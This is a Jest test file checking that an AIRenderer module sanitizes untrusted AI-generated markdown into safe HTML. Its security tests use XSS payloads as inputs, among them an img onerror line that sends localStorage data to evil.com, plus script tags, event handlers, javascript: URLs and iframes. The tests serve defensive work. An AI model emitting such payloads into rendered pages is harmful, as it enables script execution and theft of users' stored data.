/**
 * AIRenderer tests
 *
 * AIRenderer.toHtml is the single choke point that turns UNTRUSTED AI markdown
 * into HTML for innerHTML. These tests run the REAL marked + DOMPurify pipeline
 * (both vendored libs are loaded, not mocked) so we verify actual sanitization
 * behavior, not a stub's idea of it.
 *
 * The security block is the reason this module exists — a compromised or
 * prompt-injected AI response must never be able to execute script or exfiltrate
 * data via injected markup.
 */

const path = require('path');
const { loadModule } = require('../helpers/loadModule.js');

// Load the real vendored marked so tests exercise the true markdown->HTML path.
// (DOMPurify is already exposed as window.DOMPurify by test/setup.js.)
const marked = require(path.resolve(__dirname, '../../www/vendor/marked.min.js'));

describe('AIRenderer', () => {
  let AIRenderer;

  beforeEach(() => {
    window.marked = marked;
    // Utils.escapeHtml is used by the DOMPurify-missing fallback path.
    window.Utils = {
      escapeHtml: (s) =>
        String(s)
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;'),
    };
    AIRenderer = loadModule('utils/aiRenderer.js', 'AIRenderer');
    // Reset the module-level "configured" latch between tests since the global
    // survives across the suite (loadModule re-evals but the object is fresh).
    AIRenderer._configured = false;
  });

  // ---- Happy path: legitimate markdown formatting survives ----
  describe('toHtml — formatting', () => {
    it('wraps output in an .ai-content container', () => {
      const html = AIRenderer.toHtml('hello');
      expect(html).toContain('class="ai-content"');
      expect(html).toContain('hello');
    });

    it('uses the compact container class when opts.compact is set', () => {
      const html = AIRenderer.toHtml('hi', { compact: true });
      expect(html).toContain('ai-content ai-content-compact');
    });

    it('renders bold and italic markdown', () => {
      const html = AIRenderer.toHtml('**bold** and *italic*');
      expect(html).toContain('<strong>bold</strong>');
      expect(html).toContain('<em>italic</em>');
    });

    it('renders lists', () => {
      const html = AIRenderer.toHtml('- one\n- two');
      expect(html).toContain('<ul>');
      expect(html).toContain('<li>one</li>');
      expect(html).toContain('<li>two</li>');
    });

    it('renders headings', () => {
      const html = AIRenderer.toHtml('# Title');
      expect(html).toMatch(/<h1[^>]*>Title<\/h1>/);
    });

    it('renders tables (GFM)', () => {
      const md = '| A | B |\n| - | - |\n| 1 | 2 |';
      const html = AIRenderer.toHtml(md);
      expect(html).toContain('<table>');
      expect(html).toContain('<td>1</td>');
    });

    it('keeps safe http/https links', () => {
      const html = AIRenderer.toHtml('[click](https://example.com)');
      expect(html).toContain('href="https://example.com"');
      expect(html).toContain('>click</a>');
    });

    it('highlights ₹ amounts with an ai-amount span', () => {
      const html = AIRenderer.toHtml('You spent ₹1,200 last month.');
      expect(html).toContain('<span class="ai-amount">₹1,200</span>');
    });

    it('returns empty string for empty/nullish input', () => {
      expect(AIRenderer.toHtml('')).toBe('');
      expect(AIRenderer.toHtml(null)).toBe('');
      expect(AIRenderer.toHtml(undefined)).toBe('');
    });

    it('strips stray LaTeX artifacts before rendering', () => {
      const html = AIRenderer.toHtml('Cost \\times 2 and \\text{net}');
      expect(html).toContain('×');
      expect(html).toContain('net');
      expect(html).not.toContain('\\times');
      expect(html).not.toContain('\\text');
    });
  });

  // ---- SECURITY: untrusted AI output must be sanitized ----
  describe('toHtml — XSS sanitization (security boundary)', () => {
    it('strips <script> tags', () => {
      const html = AIRenderer.toHtml('safe<script>alert(1)</script>text');
      expect(html).not.toContain('<script');
      expect(html).not.toContain('alert(1)');
      expect(html).toContain('safe');
      expect(html).toContain('text');
    });

    it('removes the <img onerror> data-exfiltration vector', () => {
      const payload =
        "<img src=x onerror=\"fetch('https://evil.com?d='+localStorage.getItem('myassistant_db'))\">";
      const html = AIRenderer.toHtml(payload);
      expect(html).not.toContain('<img');
      expect(html).not.toContain('onerror');
      expect(html).not.toContain('evil.com');
    });

    it('strips on* event handler attributes from allowed tags', () => {
      const html = AIRenderer.toHtml('<p onclick="steal()">text</p>');
      expect(html).not.toContain('onclick');
      expect(html).not.toContain('steal()');
      expect(html).toContain('text');
    });

    it('neutralizes javascript: URLs on links', () => {
      const html = AIRenderer.toHtml('<a href="javascript:alert(1)">x</a>');
      expect(html).not.toContain('javascript:');
    });

    it('neutralizes data: URLs on links', () => {
      const html = AIRenderer.toHtml(
        '<a href="data:text/html,<script>alert(1)</script>">x</a>'
      );
      expect(html).not.toContain('data:text/html');
    });

    it('drops <iframe> and other embedded-content tags', () => {
      const html = AIRenderer.toHtml('<iframe src="https://evil.com"></iframe>hi');
      expect(html).not.toContain('<iframe');
      expect(html).toContain('hi');
    });

    it('removes inline <style> / style attributes that could hide UI', () => {
      const html = AIRenderer.toHtml('<p style="position:fixed">x</p>');
      expect(html).not.toContain('style=');
    });

    it('handles a mixed markdown + hostile-HTML payload safely', () => {
      const md = '**Report**\n\n<img src=x onerror=alert(1)>\n\n- item';
      const html = AIRenderer.toHtml(md);
      expect(html).toContain('<strong>Report</strong>');
      expect(html).toContain('<li>item</li>');
      expect(html).not.toContain('onerror');
      expect(html).not.toContain('<img');
    });
  });

  // ---- Fallback & resilience ----
  describe('toHtml — fallback behavior', () => {
    it('fails SAFE (escapes, never emits raw HTML) when DOMPurify is missing', () => {
      const savedPurify = window.DOMPurify;
      window.DOMPurify = undefined;
      try {
        const html = AIRenderer.toHtml('<script>alert(1)</script>');
        // marked still ran, but _sanitize must escape rather than pass through.
        expect(html).not.toContain('<script>alert(1)</script>');
        expect(html).toContain('&lt;script&gt;');
      } finally {
        window.DOMPurify = savedPurify;
      }
    });

    it('falls back to escape-and-break when marked is missing', () => {
      const savedMarked = window.marked;
      window.marked = undefined;
      try {
        const html = AIRenderer.toHtml('line1\nline2 <b>x</b>');
        expect(html).toContain('line1<br>line2');
        // marked-missing branch escapes directly, so raw tags must be escaped.
        expect(html).toContain('&lt;b&gt;');
        expect(html).not.toContain('<b>x</b>');
      } finally {
        window.marked = savedMarked;
      }
    });
  });

  // ---- toPlainText (unchanged, but guard against regressions) ----
  describe('toPlainText', () => {
    it('strips markdown to readable plain text', () => {
      const txt = AIRenderer.toPlainText('# Title\n**bold** and [link](https://a.b)');
      expect(txt).not.toContain('#');
      expect(txt).not.toContain('**');
      expect(txt).toContain('Title');
      expect(txt).toContain('bold');
      expect(txt).toContain('link');
      expect(txt).not.toContain('https://a.b');
    });

    it('returns empty string for nullish input', () => {
      expect(AIRenderer.toPlainText('')).toBe('');
      expect(AIRenderer.toPlainText(null)).toBe('');
    });
  });
});
